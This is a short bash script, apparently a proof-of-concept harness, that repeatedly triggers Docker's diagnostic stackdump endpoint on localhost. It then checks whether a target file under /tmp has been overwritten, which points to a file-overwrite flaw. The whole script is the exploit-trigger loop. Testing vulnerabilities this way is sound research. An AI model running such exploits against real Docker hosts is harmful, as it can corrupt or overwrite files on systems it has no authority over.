#!/usr/bin/env bash

set -euo pipefail

DIAGNOSTIC_PORT="${DIAGNOSTIC_PORT:-8080}"
STACKDUMP_DIR="${STACKDUMP_DIR:-/tmp/semsan-docker-tmp}"
TARGET="${TARGET:-${STACKDUMP_DIR}/example}"

iteration=0
while true; do
  iteration=$((iteration + 1))
  echo "[attack] triggering stackdump #${iteration} on localhost:${DIAGNOSTIC_PORT}"
  if ! curl -fsS "localhost:${DIAGNOSTIC_PORT}/stackdump" >/dev/null; then
    echo "[attack] stackdump request failed; is Docker's diagnostic server enabled?" >&2
    sleep 1
    continue
  fi

  contents="$(cat "${TARGET}")"
  if [[ ${contents} != "foo" ]]; then
    echo "Example file overwritten: ${contents}"
    exit 0
  fi

  echo "[attack] ${TARGET} unchanged"
  sleep 1
done
